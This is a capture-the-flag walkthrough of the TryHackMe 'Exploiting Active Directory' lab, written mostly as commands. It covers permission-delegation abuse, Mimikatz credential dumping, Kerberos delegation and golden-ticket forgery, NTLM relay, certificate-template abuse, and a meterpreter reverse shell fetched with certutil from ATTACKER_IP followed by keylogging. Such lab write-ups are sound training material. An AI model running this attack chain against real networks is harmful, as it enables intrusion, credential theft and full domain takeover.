# Exploiting Active Directory

## High-Level Overview

Perform common AD exploitation techniques.

## Tools Needed

* Nmap
* Microsoft Management Console (MMC)
* Metasploit
* Impacket
* Runas
* Bloodhound
* Rubeus
* Mimikatz
* Kekeo
* Xfreerdp

## Walkthrough

### Connecting to the Network

* Download the Network VPN Server `Exploitingad` configuration file for OpenVPN
* Connect using OpenVPN and the TryHackMe VPN file
	* `sudo openvpn user-exploitingad.ovpn`
* Configure the DNS on the host which you are running the VPN connection:
	* Edit the `resolv.conf` file with the command `sudo nano /etc/resolv.conf` and add the line `nameserver 10.200.79.101` at the end of the file.
	* Or use `sudo resolvectl dns exploitad 10.200.79.101`
	* `10.200.79.101` is the IP of the `THMDC` in my case.
* Test DNS resolution with the command `nslookup thmdc.za.tryhackme.loc` - this should resolve to the IP of the DC
* Your IP for can be identified using `ip add show exploitad` - the inet IP you will use for reverse shells, listeners, etc.

### Requesting Your Credentials

To get the AD credentials required for both SSH and RDP connections to a machine on this network, we need to navigate to `http://distributor.za.tryhackme.loc/creds` and request a credential pair by clicking `Get Credentials`

We can connect using SSH with the following command:

```bash
$ ssh za.tryhackme.loc\\AD_USERNAME@thmwrk1.za.tryhackme.loc
# supply the provided password
```

### Task 2

The network has already been enumerated using `Sharphound`, so we will be downloading the task files and ingesting them into `Bloodhound` to visualise the AD structure:

* In a terminal window, run `sudo neo4j console`
* In another terminal window, run `bloodhound --no-sandbox`
	* Default credentials are `neo4j`:`neo4j`
* Query `Bloodhound` for the shortest path to compromise Tier 2 Admins group with the following:
	* `DOMAIN USERS@ZA.TRYHACKME.LOC`
	* `TIER 2 ADMINS@ZA.TRYHACKME.LOC`
* Bloodhound helps us identify some permission delegation misuses:
	* IT Support group delegated AddMembers ACE to Domain Users Group
	* Tier 2 Admins group have delegated ForceChangePassword to IT Support group

This information helps us exploit the AD environment by doing the following:

* Log into the machine using SSH and the supplied credentials from the previous task
* Start a PowerShell session by issuing the command `powershell`
* We will add an AD account to the IT Support group using the command:
	* `Add-ADGroupMember "IT Support" -Members "AD_USERNAME"`
* Verify if the command worked using the cmdlet below:
	* `Get-ADGroupMember -Identity "IT Support"`
* **Note:** It can take up to 10 minutes to update the permissions. Ideally you should disconnect and reconnect after some time passes.
* Identify members of the Tier 2 Admins group in order to select a target using the command:
	* `Get-ADGroupMember -Identity "Tier 2 Admins"`
* Since this is a shared network, I picked an account from further down the list. We will be using the account `t2_caroline.dawson`
* With our new IT Support privilege delegation, we can force change the password of this admin account with the commands:
	* `$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force`
	* `Set-ADAccountPassword -Identity "t2_caroline.dawson" -Reset -NewPassword $Password`
* To get the flag for this task we can use the altered account to log in over SSH on the same machine:
	* `ssh za.tryhackme.loc\\t2_caroline.dawson@thmwrk1.za.tryhackme.loc`
* Flag can be found at `C:\Users\Administrator\Desktop\flag1.txt`

### Task 3

For this task, we need to use the previously compromised Tier 2 Admin Account.

We will run some enumeration commands to see if there are any available delegations:

```powershell
> Import-Module C:\Tools\PowerView.ps1
> Get-NetUser -TrustedToAuth
```

This shows us that the `svcIIS` account can delegate the HTTP and WSMAN services on `THMSERVER1`. Since we have administrator privileges we can use `Mimikatz` (already located on this machine) to dump LSASecrets with the following commands:

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
> token::elevate
> lsadump::secrets
```

We gain access to the password associated with the `svcIIS` account, and we can perform a Kerberos delegation attack using `Kekeo` and `mimikatz`. Exit the previous `mimikatz` session before proceeding.

* We can find `Kekeo` on the machine and open it with the command:
	* `C:\Tools\kekeo\x64\kekeo.exe`
* We generate the tickets using the following command:
	* `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@`
* With our generated TGT for for the account that can perform the delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN We can run the following command to allow us to create a PSSession on `THMSERVER1`:
	* `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc`
	* `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
* Exit `Kekeo` and start `Mimikatz`
	* `C:\Tools\mimikatz_trunk\x64\mimikatz.exe`
* Import the 2 TGS tickets using `Mimikatz`:
	* `privilege::debug`
	* `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
	* `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
* Exit `Mimikatz` and run `klist` to verify if the tickets were imported
* Finally, we can create our PSSession on THMSERVER1 using the commands:
	* `New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
	* `Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
* In this new session we can get our flag, which is located at `C:\Users\Administrator\Desktop\flag2.txt`

The flag for the next task (task 4) should be obtained in this session as well. It can be found at `C:\Users\Administrator.ZA\Desktop\flag3.txt`

### Task 4

For this task a new SSH connection with the original credentials is required.

We need to connect to the `THMWRK1` machine using our originally supplied credentials using SSH like so:

```bash
$ ssh za.tryhackme.loc\\AD_USERNAME@thmwrk1.za.tryhackme.loc
```

From our SSH session on THMWRK1, we can use a WMI query to see if the Print Spooler service is running on THMSERVER2, which we don't currently have access to. We can do this using the command:

```powershell
> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

The service is indeed running. Next we need to check if SMB signing is not enforced. We can do this with the following `nmap` command from our attacking machine:

```bash
$ nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

We can see from the output that SMB Message signing is enabled but not required. That is good news for us. From our attacking machine, we need to use `Impacket` to set up the NTLM relay like so:

```bash
$ impacket-ntlmrelayx -smb2support -t smb://10.200.79.201 -debug 
# 10.200.79.201 is the IP of THMSERVER1 in my case
```

On our victim machine, we can run the command:

```powershell
$ cd C:\Tools
$ SpoolSample.exe THMSERVER2.za.tryhackme.loc ATTACKER_IP
```

From our incoming connection we get the SAM hashes dumped. This one seems most interesting:

```
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
```

We can use this hash to connect using `evil-winrm`:

```bash
$ evil-winrm -u ServerAdmin -H 3279a0c6dfe15dc3fb6e9c26dd9b066c -i 10.200.79.201
# 10.200.79.201 is the IP of THMSERVER1 in my case
```

We can get the flag located at `C:\Users\Administrator.ZA\Desktop\flag3.txt`

### Task 5

With the same `evil-winrm` session, we can complete this task.

We need to enumerate the user directories and find a `.kdbx` file. We eventually find the file `PasswordDatabase.kdbx` in `C:\Users\trevor.local\Documents`.

We can transfer this file by establishing a meterpreter shell to this machine.

To do this, on our attacking machine, we can run `msfvenom` to generate the payload for our reverse shell:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER:IP LPORT=443 -f psh -o shell.ps1
```

We should also set up a listener using `msfconsole`:

```bash
$ sudo msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST ATTACKER_IP
> set LPORT 443
> exploit
```

We will move the meterpreter shell to the victim pc.

* On your attacking machine host a Python webserver where the `shell.ps1` file is located:
	* `python3 -m http.server 80`

* On the victim machine use `certutil` to download the file:
	* `certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.ps1`

Run the `shell.ps1` file in the `evil-winrm` session. Now we have a session in our `meterpreter`.

We will find out what processes are running

```bash
> ps | grep "explorer"
```

In my case there was an explorer process running. If one is not present, it can be created using the following commands in our meterpreter listener:

```bash
> net user trevor.local Password1
> C:\auto-login.ps1 trevor.local Password1 THMSERVER1
> shutdown -r
```

Once that is done, we can migrate to a process of this user, in order to capture his input with a keylogger.

```bash
> migrate 3812
# 3812 was the PID in my case
```

We can now run the keylogger:

```bash
> keyscan_start
```

After a while, we can see if we got anything by using the command:

```bash
> keyscan_dump
# <Shift>Imreallysurenoonewillguessmypassword<CR>
```

We should also download the password file we found earlier, since this password is what it is used for:

```bash
# navigate manually to C:\Users\trevor.local\Documents
> cd ..
...
> download PasswordDatabase.kdbx
```

We can open this file using `Keepass` with our identified password.

Besides the flag that we need to solve this task, another interesting entry is the account `svcServMan` with the corresponding password `Sup3rStr0ngPass!@`.

### Task 6

For this task, we will use the `svcServMan` account to further our AD exploitation. Using Bloodhound, we can see that this user has ownership over a Group Policy Object (GPO), which is applied to the `THMSERVER2` machine.

RDP into `THMWRK1` machine with either our normal or our Tier 2 Admin account.

```bash
$ xfreerdp /v:10.200.79.248 /u:t2_caroline.dawson /p:Password1
# 10.200.79.248 is the IP of the THMWRK1 machine in my case
# or use the account provided in the first stages of the room
```

We will use `runas` to inject the AD user's credentials into memory.

```powershell
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
```

Provide the password associated with the account and verify if you have the correct credentials by typing `dir \\za.tryhackme.loc\sysvol`. In the newly spawned command prompt window, we can start MMC by typing `mmc`.

With MMC open, we will add the Group Policy Management snap in as such:

* Click `File` -> `Add/Remove Snap-in`
* Select the `Group Policy Management` snap-in and click `Add`
* Click `Ok`

We will navigate to the GPO that our user has permission to modify (Servers > Management Servers > Management Server Pushes), and we can right click on the GPO and select `Edit`. In this new Group Policy Management Editor window we can add our account to the local groups as such:

* Expand `Computer Configuration`
* Expand `Policies`
* Expand `Windows Settings`
* Expand `Security Settings`
* Right click on `Restricted Groups` and select `Add Group`
* Click Browse, enter `IT Support` and click `Check Names`
* Click `Okay` twice.

It can take up to 15 minutes for the GPO to be applied. After this, our initial account that we got from this room, which is a member of the `IT Support` group, will have administrative and RDP permissions over `THMSERVER2`. We can connect to that machine using `xfreerdp`:

```bash
$ xfreerdp /v:10.200.79.202 /u:AD_USERNAME /p:AD_PASSWORD
# 10.200.79.202 is the IP of THMSERVER2 in my case
```

We can now get the flag for this challenge which is located at `C:\Users\Administrator\Desktop\flag4.txt`

### Task 7

On this same rdp session established to get the flag from task 6, we can enumerate vulnerable certificate templates using `certutil`:

```powershell
> certutil -Template -v > templates.txt
```

Next, we will request our own certificate. We can open MMC by doing the following:

* Click `Start` -> `run`
* Type `mmc` and hit enter
* Click `File` -> `Add/Remove Snap-in`
* Add the `Certificates` snap-in and make sure to select `Computer Account` and `Local computer` on the prompts.

Now that we see the Certificate snap-in, we will request a personal certificate like so:

* Right click on `Personal` and select `All Tasks -> Request New Certificate`
* Click `Next` twice to select the AD enrollment policy
* You will see that we have one template that we can request, but first we need to provide additional information.
* Click on the `More Information` warning.
* Change the `Subject name Type` option to `Common Name` and provide any value, since it does not matter, and click `Add`
* Change the `Alternative name Type` option to `User principal name`
* Supply the UPN of the user you want to impersonate. The best would be a DA account such as `Administrator@za.tryhackme.loc` and click `Add`.

For the additional information window, you should add the following:

* `Subject name` -> Type -> Common Name -> Value -> CN=CoolCert -> Click `Add`
* `Alternative name` -> Type -> User principal name -> Value -> `Administrator@za.tryhackme.loc` -> Click `Add`
* Click `Apply` and then `OK`
* Select the certificate and click `Enroll`

Finally, we need to export our certificate with the private key:

* Right-click on the certificate and select `All Tasks` -> `Export`
* Click `Next`, select `Yes, export the private key`, and click `Next`
* Click `Next`, then select a password for the certificate since the private key cannot be exported without a password.
* Click `Next` and select a location to store the certificate
* Click `Next` and finally click `Finish`

With this certificate exported, we are ready to perform an impersonation attack.

First step will be to use `Rubeus` (already on the machine at `C:\Tools\`). We can run it in the directory where the certificate was exported so the command is easier to type:

```powershell
> C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:privatekey.pfx /password:Password1 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.79.101
# 10.200.79.101 is the IP of the THMDC child DC in my case
```

Now it's time to use `Mimikatz` (already loaded on the machine) to use the TGT and authenticate to `THMDC`:

```powershell
> C:Tools\mimikatz_trunk\x64\mimikatz.exe

> privilege::debug
> kerberos::ptt administrator.kirbi
> exit
```

We can verify if the exploit worked by trying to access `THMDC` in the same powershell session with the command:

```powershell
> dir \\THMDC.za.tryhackme.loc\c$
```

Now we can get the flag for this task by simply using the following command:

```bash
$ cat \\THMDC.za.tryhackme.loc\c$\Users\Administrator\Desktop\flag5.txt 
```

### Task 8

In the same session, we can use `Mimikatz` to perform a DC Sync to recover the KRBTGT password hash on `THMSERVER2`.

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
> privilege:;debug
> lsadump::dcsync /user:za\krbtgt
# NTLM hash: 16f9af38fca3ada405386b3b57366082
```

We also need to recover 2 SIDs: the SID of the child DC (`THMDC`) which we will impersonate in our forged TGT, and the SID of the Enterprise Admins in the parent domainm which we will add as an extra SID to our forged TGT. We can do this using `AD-RSAT` Powershell cmdlets:

```powershell
# get SID of the child domain controller
> Get-ADComputer -Identity "THMDC"
# S-1-5-21-3885271727-2693558621-2658995185-1001

# get SID of the Enterprise Admins group
> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
# S-1-5-21-3330634377-1326264276-632209373-519
```

Finally, we can exploit the bidirectional domain trust between parent and child DC. We will use `Mimikatz` again, to generate the golden ticket with the following commands:

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
> privilege::debug
> kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
```

We can now check if this is a valid ticket by testing our access to the `THMDC`, followed by checking our access for the parent DC - `THMROOTDC:`

```powershell
> dir \\thmdc.za.tryhackme.loc\c$
> dir \\thmrootdc.tryhackme.loc\c$\
```

Since we now have access to the parent DC, we can access the final flag by using the following command:

```powershell
> cat \\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt
```